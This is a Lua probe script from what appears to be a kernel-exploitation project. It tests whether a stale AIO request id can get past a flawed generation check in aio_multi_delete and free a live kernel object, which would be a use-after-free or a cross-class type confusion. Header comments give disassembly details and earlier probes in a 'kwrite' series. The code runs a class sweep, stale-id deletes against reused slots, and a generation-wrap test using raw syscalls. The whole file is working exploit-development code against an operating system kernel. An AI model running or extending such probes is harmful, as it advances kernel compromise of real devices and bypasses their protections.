-- CRASH_CLASS: MODERATE
-- PROBE 1447a: AIO stale-id aliasing and class confusion
--
-- Context: 1445a (results/phase36_realargs/1445a_aio_id_generation_20261109_171255.txt) measured the
--   identifier format on 14.10: id = 13-bit slot + 3-bit generation, the generation is per slot and
--   increments on every reuse (slot 0x20C came back as gen 0 the first time and 0x220C = gen 1 after
--   its delete), and eight concurrent submits receive sequential slots (0x205..0x20C).  A second 662
--   over the same eight ids answered 0x80020003 on all eight, so the obvious double-delete is refused.
--
--   13.60 disassembly of aio_multi_delete (results/kernel_handlers/asm, thunk 0xffffffff8ac25718 ->
--   body 0xffffffff8ad6f900) shows the gate that this probe attacks:
--       r14d = id >> 16          (generation, must be < 0x80)
--       r15d = id & 0xffff       (slot, must be != 0)
--       movsx eax, word ptr [entry]
--       cmp  gen, eax
--       jge  fail                 -- gen must be STRICTLY LESS than entry->word0
--   That is an inequality against a 16-bit counter, not an equality against the current 3-bit
--   generation.  Once a slot's counter has passed 7, every one of the eight 3-bit generation values
--   satisfies it, so an id from an earlier incarnation of the slot would be accepted and would free
--   whichever object occupies the slot now.
--
--   Whether that matters depends on who can hold the old id.  If the AIO context is per process the
--   alias is self-only and worthless; the interesting case is a different request CLASS.  669 takes
--   a class argument (1..3) and this tree has only ever submitted class 1
--   (probes/phase17_new_vectors/465a_aio_complete_then_delete.lua).  If classes differ in object
--   layout but share one slot table, then an old class-1 id deleting a live class-3 object is a real
--   type confusion inside the kernel.
--
-- -- prior art: 1445a (id format), probes/phase16_kwrite/65l_aio_race_fixed.lua (two deleters),
--   probes/phase16_kwrite/70e_race_refcount_impact.lua (double-status, not double-free),
--   probes/phase17_new_vectors/465a_aio_complete_then_delete.lua (the submit/poll/delete shape),
--   probes/phase17_new_vectors/71a_aio_id_reuse_3thread.lua (the 3-bit generation claim),
--   docs/AIO_BATCH_14_10.md ("the identifier generation is three bits"),
--   docs/AIO_GATE_14_10.md:46-51 (its lock-polarity transcription is corrected by 1445a's capture).
--   No probe in the tree has ever submitted class 2 or class 3.
--
-- Discriminator: [B] re-uses an id that has already been deleted.  A correct implementation answers
--   0x80020003 (unknown id).  0 means the stale generation passed the gate and the syscall freed the
--   live object that now occupies that slot.  [A] shows whether classes 2 and 3 exist at all.

print("=== PROBE 1447a: AIO STALE-ID ALIAS ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local AIO_SUB  = make_syscall(669)
local AIO_POLL = make_syscall(664)
local AIO_DEL  = make_syscall(662)
local GETPID   = make_syscall(20)
local SSOCKET  = make_syscall(135)
local WRITE    = make_syscall(4)
local MAP      = make_syscall(477)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sgn(rv)
    local n = to_num(rv)
    if n < 0 then return -1 end
    return n
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v)
    local ok = pcall(function() memory.write_dword(a, uint64(v)) end)
    return ok
end
local function wrq(a, v)
    local ok = pcall(function() memory.write_qword(a, uint64(v)) end)
    return ok
end
local function map(len, prot, flags, fd, off)
    local ok, va = pcall(function()
        return MAP(uint64(0), uint64(len), uint64(prot or 3),
                   uint64(flags or 0x1002), uint64(fd or 0xFFFFFFFF), uint64(off or 0))
    end)
    if not ok then return -1 end
    local n = to_num(va)
    if n < 0x10000 or n > 0x8000000000 then return -1 end
    return n
end

local function hex(n) return string.format("0x%08X", n) end
local function fmt(v) if v == nil then return "nil" end return tostring(v) end

local pid = sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("canary getpid=%d", pid))
print("")

local p = map(0x8000, 3)
if p < 0 then
    print("mmap failed -- aborting")
    print("=== PROBE 1447a ABORT ===")
    return
end

local REQ    = p + 0x0000      -- 0x28 request struct
local DATA   = p + 0x0100      -- 16-byte destination
local RESULT = p + 0x0200      -- result word
local IDS    = p + 0x0300      -- one id
local STATE  = p + 0x0400      -- one status word
local PAIR   = p + 0x0500      -- two fds
local IDS8   = p + 0x0600      -- eight ids
local STATE8 = p + 0x0700      -- eight status words
local REQ8   = p + 0x1000      -- eight request structs, 0x40 apart

local sp = sgn(SSOCKET(uint64(1), uint64(1), uint64(0), uint64(PAIR), uint64(0), uint64(0)))
local rd_fd = rd(PAIR)
local wr_fd = rd(PAIR + 4)
print(string.format("[0] socketpair rv=%s read=%d write=%d", fmt(sp), rd_fd, wr_fd))
if rd_fd <= 0 then print("socketpair failed"); return end

local payload = memory.alloc(16)
local i = 0
while i < 16 do
    memory.write_byte(payload + i, 0x41 + i)
    i = i + 1
end

local function feed()
    pcall(function() WRITE(uint64(wr_fd), uint64(payload), uint64(16), uint64(0), uint64(0), uint64(0)) end)
end

local function arm(base, class_hint)
    local j = 0
    while j < 0x28 do
        wr(base + j, 0)
        j = j + 4
    end
    wrq(base + 0x08, 16)
    wrq(base + 0x10, DATA)
    wrq(base + 0x18, RESULT)
    wr(base + 0x20, rd_fd)
end

-- submit one request of the given class; returns id and the result word
local function submit(cls, id_slot)
    arm(REQ)
    wr(id_slot, 0)
    wrq(RESULT, 0)
    local rv = sgn(AIO_SUB(uint64(1), uint64(REQ), uint64(1), uint64(cls), uint64(id_slot), uint64(0)))
    return rv, rd(id_slot), rd(RESULT)
end

local function poll1(id_slot, st_slot)
    wr(st_slot, 0x5A5A5A5A)
    local rv = sgn(AIO_POLL(uint64(id_slot), uint64(1), uint64(st_slot)))
    return rv, rd(st_slot)
end

local function del1(id_slot, st_slot)
    wr(st_slot, 0x5A5A5A5A)
    local rv = sgn(AIO_DEL(uint64(id_slot), uint64(1), uint64(st_slot)))
    return rv, rd(st_slot)
end

--------------------------------------------------------------------------
-- [A] does the class argument select a different object type at all?
--------------------------------------------------------------------------
print("")
print("[A] class sweep: submit, poll, delete for classes 1, 2 and 3")
local cls = 1
while cls <= 3 do
    feed()
    local rv, id, res = submit(cls, IDS)
    print(string.format("  class %d: 669 rv=%-5s id=%s result=%s", cls, fmt(rv), hex(id), hex(res)))
    if id ~= 0 then
        local rvp, stp = poll1(IDS, STATE)
        print(string.format("           664 rv=%-5s state=%s", fmt(rvp), hex(stp)))
        local rvd, std = del1(IDS, STATE)
        print(string.format("           662 rv=%-5s state=%s", fmt(rvd), hex(std)))
        if std == 0 then
            -- a delete that succeeded must make the id unknown: the control for [B]
            wr(STATE, 0x5A5A5A5A)
            local rvd2 = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
            print(string.format("           662 again rv=%-5s state=%s   <- control",
                fmt(rvd2), hex(rd(STATE))))
        end
    end
    cls = cls + 1
end
print("")

--------------------------------------------------------------------------
-- [B] stale-id alias: keep the id of a deleted request, let the slot be
--     reused, then delete with the OLD id.  0x80020003 is correct; 0 is an alias.
--------------------------------------------------------------------------
print("[B] stale-id alias, four rounds (old id reused against a live slot)")
local round = 1
while round <= 4 do
    feed()
    local rv1, id1, res1 = submit(1, IDS)
    if id1 == 0 then
        print(string.format("  round %d: submit published no id (result %s) -- stopping", round, hex(res1)))
        break
    end
    local slot1 = id1 % 0x2000
    local gen1 = math.floor(id1 / 0x2000) % 8
    local rvp, stp = poll1(IDS, STATE)
    local rvd, std = del1(IDS, STATE)
    feed()
    local rv2, id2, res2 = submit(1, IDS)
    local slot2 = id2 % 0x2000
    local gen2 = math.floor(id2 / 0x2000) % 8
    -- put the OLD id back and try to delete whatever now lives in that slot
    wr(IDS, id1)
    wr(STATE, 0x5A5A5A5A)
    local rvS = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
    local stS = rd(STATE)
    local verdict = "unknown id (correct)"
    if stS == 0 then verdict = "*** STALE ID ACCEPTED: the old id deleted the live object ***" end
    print(string.format("  round %d: old=%s(slot %d gen %d) del=%s poll=%s | new=%s(slot %d gen %d) | stale-662 rv=%s state=%s  %s",
        round, hex(id1), slot1, gen1, fmt(rvd), hex(std),
        hex(id2), slot2, gen2, fmt(rvS), hex(stS), verdict))
    if stS == 0 then
        -- the new request's object has just been freed by the stale id; do not touch it
        print("           (new request left alone -- its object was deleted by the stale id)")
        break
    end
    -- clean up the new request so the next round starts from a clean slot
    local rvd2 = del1(IDS, STATE)
    print(string.format("           cleanup 662 rv=%-5s state=%s", fmt(rvd2), hex(rd(STATE))))
    round = round + 1
end
print("")

--------------------------------------------------------------------------
-- [C] generation wrap: eight reuses of one slot, then the very first id
--------------------------------------------------------------------------
print("[C] generation wrap on one slot")
local ids = {}
local gens = {}
local r = 1
while r <= 9 do
    feed()
    local rv, id, res = submit(1, IDS)
    if id == 0 then
        print(string.format("  reuse %d: no id (result %s) -- stopping", r, hex(res)))
        break
    end
    ids[r] = id
    gens[r] = math.floor(id / 0x2000) % 8
    local rvd, std = del1(IDS, STATE)
    print(string.format("  reuse %d: id=%s slot=%d gen=%d del state=%s",
        r, hex(id), id % 0x2000, gens[r], hex(std)))
    r = r + 1
end
if ids[1] and ids[9] then
    print(string.format("  first id %s vs ninth id %s -- same 3-bit generation: %s",
        hex(ids[1]), hex(ids[9]), tostring(gens[1] == gens[9])))
end
print("")

print(string.format("[D] survivor pid=%d (was %d)", sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), pid))
print("")
print("=== PROBE 1447a COMPLETE ===")
